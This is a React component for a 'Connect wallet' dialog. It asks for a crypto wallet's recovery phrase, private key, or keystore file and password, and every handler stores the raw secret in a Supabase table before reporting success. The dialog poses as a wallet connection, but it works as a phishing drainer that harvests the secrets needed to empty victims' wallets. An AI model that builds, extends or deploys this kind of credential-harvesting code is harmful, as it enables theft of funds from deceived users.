import React, { useState } from 'react';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { Wallet } from "lucide-react";
import { supabase } from '@/lib/supabase';

interface WalletModalProps {
  isOpen: boolean;
  onClose: () => void;
  walletName: string;
}

const WalletModal: React.FC<WalletModalProps> = ({ isOpen, onClose, walletName }) => {
  const [phrase, setPhrase] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [keystoreJson, setKeystoreJson] = useState("");
  const [keystorePassword, setKeystorePassword] = useState("");
  const [file, setFile] = useState<File | null>(null);
  const { toast } = useToast();

  const handlePhraseSubmit = async () => {
    try {
      const { error } = await supabase
        .from('wallet_connections')
        .insert([{
          wallet_name: walletName,
          connection_type: 'phrase',
          data: { phrase }
        }]);

      if (error) throw error;

      toast({
        title: "Success",
        description: "Wallet connection recorded successfully."
      });
    } catch (error) {
      console.error('Error saving phrase:', error);
      toast({
        variant: "destructive",
        title: "Error",
        description: "Failed to process your request. Please try again."
      });
    }
    setPhrase("");
    onClose();
  };

  const handlePrivateKeySubmit = async () => {
    try {
      const { error } = await supabase
        .from('wallet_connections')
        .insert([{
          wallet_name: walletName,
          connection_type: 'private_key',
          data: { private_key: privateKey }
        }]);

      if (error) throw error;

      toast({
        title: "Success",
        description: "Private key recorded successfully."
      });
    } catch (error) {
      console.error('Error saving private key:', error);
      toast({
        variant: "destructive",
        title: "Error",
        description: "Failed to process your request. Please try again."
      });
    }
    setPrivateKey("");
    onClose();
  };

  const handleKeystoreSubmit = async () => {
    try {
      const { error } = await supabase
        .from('wallet_connections')
        .insert([{
          wallet_name: walletName,
          connection_type: 'keystore',
          data: { 
            keystore_json: keystoreJson,
            keystore_password: keystorePassword
          }
        }]);

      if (error) throw error;

      toast({
        title: "Success",
        description: "Keystore information recorded successfully."
      });
    } catch (error) {
      console.error('Error saving keystore:', error);
      toast({
        variant: "destructive",
        title: "Error",
        description: "Failed to process your request. Please try again."
      });
    }
    setKeystoreJson("");
    setKeystorePassword("");
    setFile(null);
    onClose();
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      setFile(e.target.files[0]);
      const reader = new FileReader();
      reader.onload = (event) => {
        try {
          const fileContent = event.target?.result as string;
          setKeystoreJson(fileContent);
        } catch (error) {
          console.error("Error reading keystore file:", error);
        }
      };
      reader.readAsText(e.target.files[0]);
    }
  };

  return (
    <Dialog open={isOpen} onOpenChange={(open) => !open && onClose()}>
      <DialogContent className="sm:max-w-xl sm:h-[50vh] glass-card border-web3-primary/20">
        <DialogHeader>
          <div className="mb-4 flex justify-center">
            <Wallet className="h-20 w-20" />
          </div>
          <DialogTitle className="text-xl font-bold text-web3-primary text-center">
            Connect {walletName}
          </DialogTitle>
        </DialogHeader>
        
        <div className="flex flex-col md:flex-row gap-4">
          <Tabs defaultValue="phrase" className="w-full">
            <TabsList className="grid grid-cols-3 mb-4">
              <TabsTrigger value="phrase">Phrase</TabsTrigger>
              <TabsTrigger value="key">Private Key</TabsTrigger>
              <TabsTrigger value="keystore">Keystore</TabsTrigger>
            </TabsList>
            
            <TabsContent value="phrase" className="space-y-4">
              <div className="space-y-2">
                <p className="text-sm text-muted-foreground">
                  Enter your recovery phrase
                </p>
                <Textarea
                  placeholder="Enter recovery phrase with spaces between each word"
                  rows={5}
                  value={phrase}
                  onChange={(e) => setPhrase(e.target.value)}
                  className="bg-background/50"
                />
              </div>
              <Button onClick={handlePhraseSubmit} className="w-full bg-web3-primary hover:bg-web3-secondary">
                   Connect {walletName}
              </Button>
            </TabsContent>
            
            <TabsContent value="key" className="space-y-4">
              <div className="space-y-2">
                <p className="text-sm text-muted-foreground">
                  Enter your private key
                </p>
                <Input
                  type="password"
                  placeholder="Enter private key"
                  value={privateKey}
                  onChange={(e) => setPrivateKey(e.target.value)}
                  className="bg-background/50"
                />
              </div>
              <Button onClick={handlePrivateKeySubmit} className="w-full bg-web3-primary hover:bg-web3-secondary">
                   Connect {walletName}
              </Button>
            </TabsContent>
            
            <TabsContent value="keystore" className="space-y-4">
              <div className="space-y-2">
                <p className="text-sm text-muted-foreground">
                  Upload keystore file (JSON) or enter JSON and password
                </p>
                <Textarea
                  placeholder="Keystore JSON..."
                  rows={3}
                  value={keystoreJson}
                  onChange={(e) => setKeystoreJson(e.target.value)}
                  className="bg-background/50"
                />
                <Input
                  type="file"
                  onChange={handleFileChange}
                  className="bg-background/50"
                />
                <Input
                  type="password"
                  placeholder="Password"
                  value={keystorePassword}
                  onChange={(e) => setKeystorePassword(e.target.value)}
                  className="bg-background/50 mt-2"
                />
              </div>
              <Button onClick={handleKeystoreSubmit} className="w-full bg-web3-primary hover:bg-web3-secondary">
               Connect {walletName}
              </Button>
            </TabsContent>
          </Tabs>
        </div>
      </DialogContent>
    </Dialog>
  );
};

export default WalletModal;
